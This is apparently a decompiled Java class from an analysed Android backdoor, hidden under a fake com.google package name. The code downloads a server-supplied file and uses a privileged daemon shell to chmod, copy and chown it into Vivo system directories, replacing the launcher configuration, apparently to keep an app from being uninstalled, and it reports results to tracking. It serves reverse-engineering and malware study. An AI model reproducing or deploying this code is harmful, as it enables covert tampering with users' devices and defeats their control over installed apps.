package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.content.Context;
import com.google.android.sd.biz_dynamic_dex.vivo_base.DaemonFp;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.IoUtils;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;
import org.json.JSONException;
import org.json.JSONObject;

public class OfficialUntiUninstallV3 {
  private static final int CMD = 1005;
  
  private static String uuid;
  
  private static Map<String, String> buildMap(boolean paramBoolean, String paramString) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      hashMap.put("status", "1");
      hashMap.put("result", "true");
    } else {
      hashMap.put("status", "0");
      hashMap.put("result", "false");
    } 
    hashMap.put("details", paramString);
    return (Map)hashMap;
  }
  
  private static void disableShowHiddenIcon(Context paramContext) {
    try {
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  public static void fail(Context paramContext, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1005, uuid, "client"), paramString, null));
    TrackUtils.submitTrack(paramContext, 22, buildMap(false, paramString));
  }
  
  public static void startAdd(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject();
    CmdData cmdData = new CmdData(1005, uuid, "client");
    try {
      jSONObject.put("details", paramString);
      Utils.buildSucceedRespData(cmdData, jSONObject, null);
      TrackUtils.submitTrack(paramContext, 22, buildMap(true, paramString));
      return;
    } catch (JSONException jSONException) {
      TrackUtils.submitTrack(paramContext, 22, buildMap(false, paramString));
      return;
    } 
  }
  
  private boolean startReplace(Context paramContext, JSONObject paramJSONObject, String paramString) {
    if (paramJSONObject == null)
      return false; 
    String str2 = paramJSONObject.optString("modify_md5");
    String str1 = paramJSONObject.optString("url_suffix");
    File file = new File("sdcard", String.format("BBKLauncher2_custom_%s.xml", new Object[] { paramString }));
    try {
      Utils.downloadFile(paramContext, "1", str1, file, str2);
      str1 = String.format("data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { paramString });
      StringBuilder stringBuilder3 = new StringBuilder();
      stringBuilder3.append("chmod 777 ");
      stringBuilder3.append(str1);
      DaemonFp.daemonRunShell(stringBuilder3.toString());
      stringBuilder3 = new StringBuilder();
      stringBuilder3.append("cp ");
      stringBuilder3.append(file.getAbsolutePath());
      stringBuilder3.append(" ");
      stringBuilder3.append(str1);
      DaemonFp.daemonRunShell(stringBuilder3.toString());
      file.deleteOnExit();
      StringBuilder stringBuilder2 = new StringBuilder();
      stringBuilder2.append("cp ");
      stringBuilder2.append(str1);
      stringBuilder2.append(" sdcard/");
      stringBuilder2.append(String.format("BBKLauncher2_custom_%s.xml", new Object[] { paramString }));
      DaemonFp.daemonRunShell(stringBuilder2.toString());
      stringBuilder2 = new StringBuilder();
      stringBuilder2.append("chmod 777 ");
      stringBuilder2.append(str1);
      DaemonFp.daemonRunShell(stringBuilder2.toString());
      stringBuilder2 = new StringBuilder();
      stringBuilder2.append("chown system:system ");
      stringBuilder2.append(str1);
      DaemonFp.daemonRunShell(stringBuilder2.toString());
      str1 = IoUtils.calFileMd5(new File("sdcard", String.format("BBKLauncher2_custom_%s.xml", new Object[] { paramString })));
      if (str2.equals(str1))
        return true; 
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.append(" check_md5_fail ");
      stringBuilder1.append(str1);
      fail(paramContext, stringBuilder1.toString());
      return false;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(" down_load_fail ");
      stringBuilder.append(exception.getMessage());
      fail(paramContext, stringBuilder.toString());
      return false;
    } 
  }
  
  public static void success(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject();
    CmdData cmdData = new CmdData(1005, uuid, "client");
    try {
      disableShowHiddenIcon(paramContext);
      jSONObject.put("details", paramString);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      TrackUtils.submitTrack(paramContext, 22, buildMap(true, paramString));
      return;
    } catch (JSONException jSONException) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONException.toString(), null));
      TrackUtils.submitTrack(paramContext, 22, buildMap(false, paramString));
      return;
    } 
  }
  
  private void trackAlready(Context paramContext, int paramInt) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("already, result code: ");
    stringBuilder.append(paramInt);
    success(paramContext, stringBuilder.toString());
  }
  
  private void tryReplace(Context paramContext, JSONObject paramJSONObject) {
    // Byte code:
    //   0: aconst_null
    //   1: astore #5
    //   3: aconst_null
    //   4: astore #6
    //   6: aload_1
    //   7: invokevirtual getApplicationContext : ()Landroid/content/Context;
    //   10: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
    //   13: ldc 'content://com.vivo.abe.unifiedconfig.provider/configs'
    //   15: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
    //   18: aconst_null
    //   19: aconst_null
    //   20: iconst_4
    //   21: anewarray java/lang/String
    //   24: dup
    //   25: iconst_0
    //   26: ldc 'BBKLauncher2'
    //   28: aastore
    //   29: dup
    //   30: iconst_1
    //   31: ldc '1'
    //   33: aastore
    //   34: dup
    //   35: iconst_2
    //   36: ldc '1.0'
    //   38: aastore
    //   39: dup
    //   40: iconst_3
    //   41: ldc 'com.bbk.launcher2_configs'
    //   43: aastore
    //   44: aconst_null
    //   45: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   48: astore #7
    //   50: aload #7
    //   52: ifnull -> 573
    //   55: aload #7
    //   57: astore #6
    //   59: aload #7
    //   61: astore #5
    //   63: aload #7
    //   65: invokeinterface getCount : ()I
    //   70: iconst_1
    //   71: if_icmple -> 154
    //   74: aload #7
    //   76: astore #6
    //   78: aload #7
    //   80: astore #5
    //   82: new java/lang/StringBuilder
    //   85: dup
    //   86: invokespecial <init> : ()V
    //   89: astore_2
    //   90: aload #7
    //   92: astore #6
    //   94: aload #7
    //   96: astore #5
    //   98: aload_2
    //   99: ldc 'cursor_count_'
    //   101: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   104: pop
    //   105: aload #7
    //   107: astore #6
    //   109: aload #7
    //   111: astore #5
    //   113: aload_2
    //   114: aload #7
    //   116: invokeinterface getCount : ()I
    //   121: invokevirtual append : (I)Ljava/lang/StringBuilder;
    //   124: pop
    //   125: aload #7
    //   127: astore #6
    //   129: aload #7
    //   131: astore #5
    //   133: aload_1
    //   134: aload_2
    //   135: invokevirtual toString : ()Ljava/lang/String;
    //   138: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   141: aload #7
    //   143: ifnull -> 153
    //   146: aload #7
    //   148: invokeinterface close : ()V
    //   153: return
    //   154: aload #7
    //   156: astore #6
    //   158: aload #7
    //   160: astore #5
    //   162: aload #7
    //   164: invokeinterface getCount : ()I
    //   169: istore_3
    //   170: iload_3
    //   171: ifne -> 320
    //   174: aload #7
    //   176: astore #6
    //   178: aload #7
    //   180: astore #5
    //   182: aload_1
    //   183: ldc 'start_add'
    //   185: invokestatic startAdd : (Landroid/content/Context;Ljava/lang/String;)V
    //   188: aload #7
    //   190: astore #6
    //   192: aload #7
    //   194: astore #5
    //   196: aload_2
    //   197: ldc '2304'
    //   199: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   202: astore #8
    //   204: aload #7
    //   206: astore #6
    //   208: aload #7
    //   210: astore #5
    //   212: aload_2
    //   213: ldc 'permission'
    //   215: invokevirtual getBoolean : (Ljava/lang/String;)Z
    //   218: ifeq -> 292
    //   221: aload #7
    //   223: astore #6
    //   225: aload #7
    //   227: astore #5
    //   229: aload_0
    //   230: aload_1
    //   231: aload #8
    //   233: sipush #2304
    //   236: invokestatic valueOf : (I)Ljava/lang/String;
    //   239: invokespecial startReplace : (Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)Z
    //   242: ifeq -> 274
    //   245: aload #7
    //   247: astore #6
    //   249: aload #7
    //   251: astore #5
    //   253: aload_1
    //   254: ldc_w 'need_insertDb'
    //   257: invokestatic success : (Landroid/content/Context;Ljava/lang/String;)V
    //   260: aload #7
    //   262: astore #6
    //   264: aload #7
    //   266: astore #5
    //   268: invokestatic updateLauncherBroadcastDelay : ()V
    //   271: goto -> 307
    //   274: aload #7
    //   276: astore #6
    //   278: aload #7
    //   280: astore #5
    //   282: aload_1
    //   283: ldc_w 'replace_fail'
    //   286: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   289: goto -> 307
    //   292: aload #7
    //   294: astore #6
    //   296: aload #7
    //   298: astore #5
    //   300: aload_1
    //   301: ldc_w 'no permission'
    //   304: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   307: aload #7
    //   309: ifnull -> 319
    //   312: aload #7
    //   314: invokeinterface close : ()V
    //   319: return
    //   320: aload #7
    //   322: astore #6
    //   324: aload #7
    //   326: astore #5
    //   328: aload #7
    //   330: invokeinterface moveToNext : ()Z
    //   335: ifeq -> 588
    //   338: aload #7
    //   340: astore #6
    //   342: aload #7
    //   344: astore #5
    //   346: aload #7
    //   348: aload #7
    //   350: ldc_w 'id'
    //   353: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   358: invokeinterface getInt : (I)I
    //   363: istore_3
    //   364: aload #7
    //   366: astore #6
    //   368: aload #7
    //   370: astore #5
    //   372: iload_3
    //   373: invokestatic isConfigReplacedByDaemon : (I)I
    //   376: istore #4
    //   378: iload #4
    //   380: iconst_2
    //   381: if_icmpeq -> 412
    //   384: aload #7
    //   386: astore #6
    //   388: aload #7
    //   390: astore #5
    //   392: aload_0
    //   393: aload_1
    //   394: iload #4
    //   396: invokespecial trackAlready : (Landroid/content/Context;I)V
    //   399: aload #7
    //   401: ifnull -> 411
    //   404: aload #7
    //   406: invokeinterface close : ()V
    //   411: return
    //   412: aload #7
    //   414: astore #6
    //   416: aload #7
    //   418: astore #5
    //   420: aload_2
    //   421: iload_3
    //   422: invokestatic valueOf : (I)Ljava/lang/String;
    //   425: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   428: astore #8
    //   430: aload #8
    //   432: ifnull -> 504
    //   435: aload #7
    //   437: astore #6
    //   439: aload #7
    //   441: astore #5
    //   443: aload_0
    //   444: aload_1
    //   445: aload #8
    //   447: iload_3
    //   448: invokestatic valueOf : (I)Ljava/lang/String;
    //   451: invokespecial startReplace : (Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)Z
    //   454: ifeq -> 486
    //   457: aload #7
    //   459: astore #6
    //   461: aload #7
    //   463: astore #5
    //   465: invokestatic updateLauncherBroadcast : ()V
    //   468: aload #7
    //   470: astore #6
    //   472: aload #7
    //   474: astore #5
    //   476: aload_1
    //   477: ldc_w 'success'
    //   480: invokestatic success : (Landroid/content/Context;Ljava/lang/String;)V
    //   483: goto -> 320
    //   486: aload #7
    //   488: astore #6
    //   490: aload #7
    //   492: astore #5
    //   494: aload_1
    //   495: ldc_w 'replace_fail'
    //   498: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   501: goto -> 320
    //   504: aload #7
    //   506: astore #6
    //   508: aload #7
    //   510: astore #5
    //   512: new java/lang/StringBuilder
    //   515: dup
    //   516: invokespecial <init> : ()V
    //   519: astore #8
    //   521: aload #7
    //   523: astore #6
    //   525: aload #7
    //   527: astore #5
    //   529: aload #8
    //   531: ldc_w 'can_not_find_config_'
    //   534: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   537: pop
    //   538: aload #7
    //   540: astore #6
    //   542: aload #7
    //   544: astore #5
    //   546: aload #8
    //   548: iload_3
    //   549: invokevirtual append : (I)Ljava/lang/StringBuilder;
    //   552: pop
    //   553: aload #7
    //   555: astore #6
    //   557: aload #7
    //   559: astore #5
    //   561: aload_1
    //   562: aload #8
    //   564: invokevirtual toString : ()Ljava/lang/String;
    //   567: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   570: goto -> 320
    //   573: aload #7
    //   575: astore #6
    //   577: aload #7
    //   579: astore #5
    //   581: aload_1
    //   582: ldc_w 'cursor_null'
    //   585: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   588: aload #7
    //   590: ifnull -> 630
    //   593: aload #7
    //   595: astore #5
    //   597: aload #5
    //   599: invokeinterface close : ()V
    //   604: return
    //   605: astore_1
    //   606: goto -> 631
    //   609: astore_2
    //   610: aload #5
    //   612: astore #6
    //   614: aload_1
    //   615: aload_2
    //   616: invokestatic getStackTraceString : (Ljava/lang/Throwable;)Ljava/lang/String;
    //   619: invokestatic fail : (Landroid/content/Context;Ljava/lang/String;)V
    //   622: aload #5
    //   624: ifnull -> 630
    //   627: goto -> 597
    //   630: return
    //   631: aload #6
    //   633: ifnull -> 643
    //   636: aload #6
    //   638: invokeinterface close : ()V
    //   643: aload_1
    //   644: athrow
    //   645: astore_1
    //   646: return
    //   647: astore_1
    //   648: return
    //   649: astore_1
    //   650: return
    //   651: astore_1
    //   652: return
    //   653: astore_2
    //   654: goto -> 643
    // Exception table:
    //   from	to	target	type
    //   6	50	609	java/lang/Exception
    //   6	50	605	finally
    //   63	74	609	java/lang/Exception
    //   63	74	605	finally
    //   82	90	609	java/lang/Exception
    //   82	90	605	finally
    //   98	105	609	java/lang/Exception
    //   98	105	605	finally
    //   113	125	609	java/lang/Exception
    //   113	125	605	finally
    //   133	141	609	java/lang/Exception
    //   133	141	605	finally
    //   146	153	645	java/lang/Exception
    //   162	170	609	java/lang/Exception
    //   162	170	605	finally
    //   182	188	609	java/lang/Exception
    //   182	188	605	finally
    //   196	204	609	java/lang/Exception
    //   196	204	605	finally
    //   212	221	609	java/lang/Exception
    //   212	221	605	finally
    //   229	245	609	java/lang/Exception
    //   229	245	605	finally
    //   253	260	609	java/lang/Exception
    //   253	260	605	finally
    //   268	271	609	java/lang/Exception
    //   268	271	605	finally
    //   282	289	609	java/lang/Exception
    //   282	289	605	finally
    //   300	307	609	java/lang/Exception
    //   300	307	605	finally
    //   312	319	647	java/lang/Exception
    //   328	338	609	java/lang/Exception
    //   328	338	605	finally
    //   346	364	609	java/lang/Exception
    //   346	364	605	finally
    //   372	378	609	java/lang/Exception
    //   372	378	605	finally
    //   392	399	609	java/lang/Exception
    //   392	399	605	finally
    //   404	411	649	java/lang/Exception
    //   420	430	609	java/lang/Exception
    //   420	430	605	finally
    //   443	457	609	java/lang/Exception
    //   443	457	605	finally
    //   465	468	609	java/lang/Exception
    //   465	468	605	finally
    //   476	483	609	java/lang/Exception
    //   476	483	605	finally
    //   494	501	609	java/lang/Exception
    //   494	501	605	finally
    //   512	521	609	java/lang/Exception
    //   512	521	605	finally
    //   529	538	609	java/lang/Exception
    //   529	538	605	finally
    //   546	553	609	java/lang/Exception
    //   546	553	605	finally
    //   561	570	609	java/lang/Exception
    //   561	570	605	finally
    //   581	588	609	java/lang/Exception
    //   581	588	605	finally
    //   597	604	651	java/lang/Exception
    //   614	622	605	finally
    //   636	643	653	java/lang/Exception
  }
  
  private static void updateLauncherBroadcast() {
    DaemonFp.daemonRunShell("am broadcast -a com.vivo.daemonService.unifiedconfig.update_finish_broadcast_BBKLauncher2 -p com.bbk.launcher2");
  }
  
  private static void updateLauncherBroadcastDelay() {
    (new Timer()).schedule(new TimerTask() {
          public void run() {
            OfficialUntiUninstallV3.updateLauncherBroadcast();
          }
        },  8000L);
  }
  
  public void work(Context paramContext, JSONObject paramJSONObject) {
    uuid = paramJSONObject.optString("uuid");
    tryReplace(paramContext, paramJSONObject);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\be7a2b643d7e8543f49994ffeb0ee0b6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\OfficialUntiUninstallV3.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */